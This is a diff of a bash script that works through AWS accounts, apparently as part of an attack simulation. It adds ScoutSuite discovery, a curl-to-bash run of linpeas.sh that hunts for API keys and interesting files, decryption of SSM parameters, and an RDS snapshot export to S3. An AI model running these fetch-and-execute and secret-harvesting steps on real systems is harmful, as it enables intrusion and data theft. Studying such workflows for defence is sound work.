@@ -55,26 +55,14 @@ aws configure set output json --profile=$PROFILE
 log "Running: aws sts get-caller-identity --profile=$PROFILE"
 aws sts get-caller-identity --profile=$PROFILE >> $LOGFILE 2>&1
 
-log "Running discovery..."
-# docker run --rm --name=scoutsuite --env-file=.aws-ec2-instance rossja/ncc-scoutsuite:aws-latest scout aws
+log "Running cloud discovery..."
+docker run --rm --name=scoutsuite --env-file=.aws-ec2-instance rossja/ncc-scoutsuite:aws-latest scout aws
+log "done."
+
+log "Running local discovery..."
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex >> $LOGFILE 2>&1
+log "done."
 opts="--output json"
-for REGION in $(aws ec2 describe-regions --output text | cut -f4); do
-    log "Discovery using AWS_REGION: $REGION"
-    log "Running: aws iam list-users $opts --region \"$REGION\""
-    aws iam list-users $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
-    log "Running: aws iam list-roles $opts --region \"$REGION\""
-    aws iam list-roles $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
-    log "Running: aws iam list-policies $opts --region \"$REGION\""
-    aws iam list-policies $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
-    log "Running: aws iam list-instance-profiles $opts --region \"$REGION\""
-    aws list-instance-profiles $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
-    log "Running: aws s3api list-buckets $opts --region \"$REGION\""
-    aws s3api list-buckets $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
-    log "Running: aws rds describe-db-instances $opts --region \"$REGION\""
-    aws rds describe-db-instances $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
-    log "Running: aws ssm describe-parameters $opts --region \"$REGION\""
-    aws ssm describe-parameters $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
-done
 
 aws ssm get-parameter --name="db_host" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
 aws ssm get-parameter --name="db_name" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
@@ -130,6 +118,10 @@ aws kms list-keys --query 'Keys[].KeyId' --profile=$PROFILE --region=$REGION --o
 done
 log "KMS Key Id: $KMS_KEY_ID"
 
+log "Obtaining rds export role..."
+RDS_EXPORT_ROLE_ARN=$(aws iam list-roles | jq -r ".Roles[] | select(.RoleName==\"rds-s3-export-role-$ENVIRONMENT-$DEPLOYMENT\") | .Arn")
+log "RDS export role: $RDS_EXPORT_ROLE_ARN"
+
 log "Exporting rds snapshot to s3..."
 aws rds start-export-task \
     --profile=$PROFILE  \
@@ -138,7 +130,7 @@ aws rds start-export-task \
     --source-arn $DB_SNAPSHOT_ARN \
     --s3-bucket-name db-backup-$ENVIRONMENT-$DEPLOYMENT \
     --s3-prefix "$CURRENT_DATE" \
-    --iam-role-arn rds-s3-export-role-$ENVIRONMENT-$DEPLOYMENT \
+    --iam-role-arn $RDS_EXPORT_ROLE_ARN \
     --kms-key-id=$KMS_KEY_ID \
     $opts >> $LOGFILE 2>&1
 
